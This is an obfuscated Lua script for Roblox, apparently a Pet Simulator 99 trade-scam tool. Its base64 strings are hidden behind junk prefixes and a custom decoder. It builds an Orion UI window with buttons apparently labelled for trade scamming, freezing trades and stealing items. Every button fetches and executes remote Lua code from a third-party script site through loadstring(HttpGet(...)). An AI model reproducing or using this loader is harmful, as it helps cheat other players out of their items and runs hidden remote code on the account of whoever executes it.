local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
function FegQiGsISLklGTnQaGagZrMtSnNMUxbj(data) m=string.sub(data, 0, 250) data=data:gsub(m,'')

data = string.gsub(data, '[^'..b..'=]', '') return (data:gsub('.', function(x) if (x == '=') then return '' end local r,f='',(b:find(x)-1) for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end return r; end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x) if (#x ~= 8) then return '' end local c=0 for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end return string.char(c) end)) end


 


local player = game.Players.LocalPlayer

 local OrionLib = loadstring(game:HttpGet((FegQiGsISLklGTnQaGagZrMtSnNMUxbj('RgxTqXvJOlmVgEThmSkKSLfTwPZDyiZeusQIWcTHPOEtQCUsQrjcAhRAPRleLEsqtHHJDbIcPUfPOHTJbfgBoJIiNAyPFomPnFRYrHUQWrcUwjpMWHSjFfJmBjoJBFSXOKAozQASYYPAERnbSEkQlpRZDHvMVMFPYYHWSkBJKlzGXnqSaPuoaZDJtLmxlxCKQMBERYYnHYzyGnUTlNsfnmSzLFZPUjTZBxuYhtSelbQjtvpDtykDcMlFDAaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3NobGV4d2FyZS9Pcmlvbi9tYWluL3NvdXJjZQ=='))))()

local Window = OrionLib:MakeWindow({Name = FegQiGsISLklGTnQaGagZrMtSnNMUxbj('LRXFeHtRDDlNRkxHkMVgtbfWJKFfCXPjagBTpDgBQyAmvcbrYokdCHEoJtwhAiRmrodnFYatniOJRFNBucLcYTsDFvtqmGzKPizxZcouDoWNoljbMTcqaCAqVQAXYaaxsOzXoQcgvhbZwoHjKKzMCZrVKXxJflQIkkRKdfEsWtnIZvOsnKrhNgMsEOfryHAQjxSJuxbEtyzNaADdfLhrjChbfVPHBKNdKDSCLGVYggUQyiUDsRotwRlVaEUHM5OSBUcmFkZSBTY2FtbQ=='), HidePremium = false, SaveConfig = true, ConfigFolder = FegQiGsISLklGTnQaGagZrMtSnNMUxbj('ukpmkoawzZGmvrbHbyFcrpFQdVdMWWpLiBcjUKHHBiiPLBrdXVPajKvIIgsJKlwIDioEiEvdmRdKexPNSdhXjzLNRaFfuLRbjzZiXQluPVBQhcRrbKRAibliDltJBisERwcINgnytxlXLDVnwFSBcVhzTGjfiNzeiWYvlCZhLgjdiNzoaLDefjOjkmbaUWRyXeddVUEAaHFtgQdhnKCoIvVrDnCHHvbMWsFoUjhyFqfywVJlfkYnHcusXNT3Jpb25UZXN0')})

--[[
Name = <string> - The name of the UI.
HidePremium = <bool> - Whether or not the user details shows Premium status or not.
SaveConfig = <bool> - Toggles the config saving in the UI.
ConfigFolder = <string> - The name of the folder where the configs are saved.
IntroEnabled = <bool> - Whether or not to show the intro animation.
IntroText = <string> - Text to show in the intro animation.
IntroIcon = <string> - URL to the image you want to use in the intro animation.
Icon = <string> - URL to the image you want displayed on the window.
CloseCallback = <function> - Function to execute when the window is closed.
]]

local Tab = Window:MakeTab({
	Name = FegQiGsISLklGTnQaGagZrMtSnNMUxbj('NWtsaZTCXidLbwoibqOPXQvzYupxzfoIEGAczsXAmVVBaTBUPjOZdavoPUjclxqVKvBitmvOTFMjsUgdkFcUiLwdZijAzipnmQEpGuRLyDYlgUxBxrINNocUlRzcqUUvMbgVoFIBoNrmnQxSoVPOATwpthaIncsVHKamMcMKgLDfFyLRoOukbYyxfgFiFcHiTvnHEOvLOAgqzvPUuyCHDVSsqwdHgFqkuTKBfrsOqQpcMVSTfmyPdqoPWgVHJhZGUgU2NhbW0='),
	Icon = FegQiGsISLklGTnQaGagZrMtSnNMUxbj('PIfMztZkSGahudywLFkXPOHmDLaamEbcXktwwrtbIcNHuEhfVtTAuSaFJndKlzOuFCbrOgRlGGXIMlkltYUswRdKnLDbGSZbFNaGoEZarzyLmkVwEdLoXxNGXcxhJwQNbxlJSykdPZlmFnfSdiIzTbVqSuMRRrJwVVGFErjEwvWvEfwyyhHPthXlJywFGWlcHqanHriVJVPtEAbKJudkhAsoOJpBcmMDSEfALHKHzzhTXstvdwhVuFEnIxcmJ4YXNzZXRpZDovLzQ0ODMzNDU5OTg='),
	PremiumOnly = false
})

--[[
Name = <string> - The name of the tab.
Icon = <string> - The icon of the tab.
PremiumOnly = <bool> - Makes the tab accessible to Sirus Premium users only.
]]

local Section = Tab:AddSection({
	Name = FegQiGsISLklGTnQaGagZrMtSnNMUxbj('zquCYNxJrYgxWalLhYAqVbOVIbTphAHqgwIBcnICiVvdjhyMhDNxIajTTEMWHzyUGaMAlIHSSEXuZGDctlxWxCJKdwilnxAeAMiiMYyLpeiCdvoAWffEoIIjrdWSSOgQObyJSeienmfAcWXBEavpPKcvXLxMPtIxBeqLskXbKRmnhwiJzEFerwRyyDbRMjdmodrPzXHcHbnGzdjeZNXcTxnAfFgROmCKJhvBVDBuLqqUKkBZWlgquMKbrC8J+MmQ==')
})

--[[
Name = <string> - The name of the section.
]]

OrionLib:MakeNotification({
	Name = FegQiGsISLklGTnQaGagZrMtSnNMUxbj('PoEwYwTIwiClXGKMnyqwGvqawgKYRVHXEWwoneScslyEgLjrSVEcJsHoktOLeSbBUBJAYYzeliAkHzIAtprJqsQobyrkUksNFMRGndcBczFrlyLdmxIUfMzmLongYuzScxPKtKlDxNeTgvOwVSXwLOphxQmkVbXKYerZsdqOGeqEfHXlpJprDCFIKppiElvSUiUvUDDRRpeQGBibtjWCmgEhjzvnZkviuEQqEEtojMNwZzBRjrhCJBPrUwU2NyaXB0IExvYWRlZA=='),
	Content = FegQiGsISLklGTnQaGagZrMtSnNMUxbj('XtkwUySCJhxXDcxyPlXBsWFhbFWYSgmsniAGiIxTcCXrNDixbZPIZWzDZDwXJaJagHkDrcyuXTiNXOBLHZeUdTbOyWfXCHSwEzxiIzHpRygshjDkHhpAYYDpPDjymSkHRbeqBQoZYKkNVQAygsFDZSEnfhCOMYcPsizvgVtJuTBVIWHEFrJZPSerBGDveAoBHfSUPKGcZEQgegFMotfAHAjuEJPpXaQPxtrGUNROSnGMHtGmorPcCsHqfHUHM5OSBTY3JpcHQ='),
	Image = FegQiGsISLklGTnQaGagZrMtSnNMUxbj('fblnsZiAlKgIsnXappqHFnfxlBAgGQjigFQkPZyVfQGoMagbotDsPyZMDvAiaJWWelUoEcUUhLiYPRrseXhbvRQOZYuSVianzUolxxDHbUwcgijFeQmRWQUyVglMwfJDtYHkbDqqwJMzTfuRSmbAtBgtrNdlwVigHMeRrJRIGjobAiSirJCECISTYCVDKZGhMzbzuUSfxjkabSyjnreyStTDIKamusAoNkkeHgsCnRBzQhBeRacAheyiOVcmJ4YXNzZXRpZDovLzQ0ODMzNDU5OTg='),
	Time = 5
})

Tab:AddButton({
	Name = FegQiGsISLklGTnQaGagZrMtSnNMUxbj('nICoQqLKgGfCvHlFSEzsQDySTZYkRGUFZZQmkqvruuQWoqymExtsXWEWbKtMLdWvmUcXgjjlSmkeIUhVsfddQiOSsgMVTtZTgitmGJxqUAOizOQYLgIplkpfxipzNXdCHMmSaPVCWzQKaWQmviphDNaJknvErVXFMRtyyCtVWjubnickLsMGptLZgpDOzYDTOjbJrPGbMAzOygrUriXspozkmQcnqZwSqvCQwajYoymRiVPjFTZvUPipsnT24='),
	Callback = function()
      		
loadstring(game:HttpGet(FegQiGsISLklGTnQaGagZrMtSnNMUxbj('rmzSuYnOIjLbrnKHMkwtsHZzkqxiKlcDbggrNdUjPRQHCzFvYzBPhlzXnesLfFEryUEJroohmlTXTxpJTQHeQnmNNjoeppMGDJBPeumJyFPlLXOuFzftYyBxuyGVoBjMAdAErrWeSRPiUqgimbCRbMwMGZnEZpcCiCJeUTLSUZSukWqWelDGRhKHPRuwvlgjBZMvkrmjNfMelQwvSfFOucPrSxmEgJQtuaGnBvDbBJfmiBJKULJXeqZrWhaHR0cHM6Ly9kYXJrc2NyaXB0cy5zcGFjZS9zY3JpcHRzLzhmMjYwNDE3LTU5NTMtNDkzMS1iMjRjLTg2YzAwYWE4MTAxNV8xMjU3NDIxOTc0ODU1MjIxMjU5Lmx1YQ=='),true))()
  	end    
})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]

Tab:AddButton({
	Name = FegQiGsISLklGTnQaGagZrMtSnNMUxbj('VYGZwAXgkmGxpimbCgbKJMsiSqZLwrPOoUCUDSkanuRldpGvNVfGPBEDtHfKYbTKhxxfuhQxssqqqrzFfMqUDsYttFkDPEIkxeTRELTYMPCBvyIBDVJptHvWKIYkeudOWaTYwcPGtfCkRRaaFIXrWAozyLeeEBlcXbggcpxtOawBNJhQllcndkUuxBkUogWUzFDQmQApdDkpydOdmDPpHOAJUyEyAFMyrlmqwMiwDReVFdYpsuiixdUOjUT2Zm'),
	Callback = function()
      	 
loadstring(game:HttpGet(FegQiGsISLklGTnQaGagZrMtSnNMUxbj('cosqpYtWAIUmbCIQGGWCFqLOBvXfzKClZTVdmAUYrMwTeLvohJcmJfWlCoLqBEnTMpFeAyyUavwAscvakInKreYNunKVLdzhTlKKsNhcTVtWcVNcVjTUCkeAxQkjlxPisfUOihqbIzZBxNwByMjxVYRZigPmZxBKoEzIiYJZIPcmSntlMBnhIyxOiejbFbhGSusmUeEbaNMOmGjKvxLjjflPLqhNIVljoLkgYMITldIkrUbDaONcphkpRIaHR0cHM6Ly9kYXJrc2NyaXB0cy5zcGFjZS9zY3JpcHRzLzhmMjYwNDE3LTU5NTMtNDkzMS1iMjRjLTg2YzAwYWE4MTAxNV8xMjU3NDIxOTc0ODU1MjIxMjU5Lmx1YQ=='),true))()
  	end    
})

Tab:AddButton({
	Name = FegQiGsISLklGTnQaGagZrMtSnNMUxbj('vnIgjlFqxMGSRGlFUiyPvNuWxfZAJhAcXWFXZvSZWtJxyeeTdlIxekbeiGdENsiiAnNkZNLMqonmufiwhJCyOwIVdAOzqdeozmGvNOHoEixLjiEQeIfsjaEJSjesYCVYtlVlTCvMSpCGLcJAYDiIlBBSQobWcZXbqRdgBeXmBgHcZaWxPptkPSIBzirhXVoraDXQySngjOboTzChIEIiTexnDMJCRJhGkYHZOpCeqEKwJdzIRwMGxKMkhuRnJlZXplIFRyYWRl'),
	Callback = function()
      	 
loadstring(game:HttpGet(FegQiGsISLklGTnQaGagZrMtSnNMUxbj('vOHfIZFmhlbmawBptVKMRRWTbZUusqwuFpcwFfWdxtrjuZKJWzDOCDiPelRqIMPnNTGqxqfmEGSbUcCWGDTdfgFbYPmSToCmlGkNAWcfSFJVLuKHywscQvZyLzSHTkgZeAtYBxMCGJqwCIajpCumDEdtwxIDDvqPKbJkVwHsQlNIjFgFOGCQEgLnUovZVadFEouiMtaDrQoXmoznFIiovcKqZhkzwCjWwpqOqgTeMiQOAPfKxRtXtlkmYsaHR0cHM6Ly9kYXJrc2NyaXB0cy5zcGFjZS9zY3JpcHRzLzhmMjYwNDE3LTU5NTMtNDkzMS1iMjRjLTg2YzAwYWE4MTAxNV8xMjU3NDIxOTc0ODU1MjIxMjU5Lmx1YQ=='),true))()
  	end    
})

Tab:AddButton({
	Name = FegQiGsISLklGTnQaGagZrMtSnNMUxbj('qwatiDHnCIGERRaNjASdNXOIZrIsQqsGwGXLtofDpniELXhGeZYnTJjRvFQojgBJrIVCrbadwBwiHJDYhFuWaTJGxijqjaGfIQnxnXrAFwWSRnjorjoWCDUtvtOfWbCWKfxJLWljPNXTAFHmCoSOMznByjplDvleBsgjFZfEwHeqxAlmQmjVakLUBgRtKmaUGXRbhXgGUmTZWnhWRIMhwvepyAjVQegHEkYbrwMLukLhbcFhCkaRdUJzjrU3RlYWwgSXRlbXM='),
	Callback = function()
      		
loadstring(game:HttpGet(FegQiGsISLklGTnQaGagZrMtSnNMUxbj('WTwfoBwYiLMwYyiLnGwBPbsbobJPnOcMRwBePItwcvhiEQkObXepLxBTiNebQdaWvocUDZKQAtgreASEKAUgqSZsDLYEZVzimzRctNUiBMzUgsLoIFSnmsvOLvIVJMdDBJzUDUJlWOMzrmXbbhNvpMscuqgGvWCSwlQWjLIIWbnvroEBcMQfMprmtYDDIlnMzyyDBBYVdQSZCfcVOIcobsRSLuZVKlMLjOCaXpjpmoiAbbIZsethpPOhxRaHR0cHM6Ly9kYXJrc2NyaXB0cy5zcGFjZS9zY3JpcHRzLzhmMjYwNDE3LTU5NTMtNDkzMS1iMjRjLTg2YzAwYWE4MTAxNV8xMjU3NDIxOTc0ODU1MjIxMjU5Lmx1YQ=='),true))()
  	end    
})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]

--[[
Title = <string> - The title of the notification.
Content = <string> - The content of the notification.
Image = <string> - The icon of the notification.
Time = <number> - The duration of the notfication.
]]    
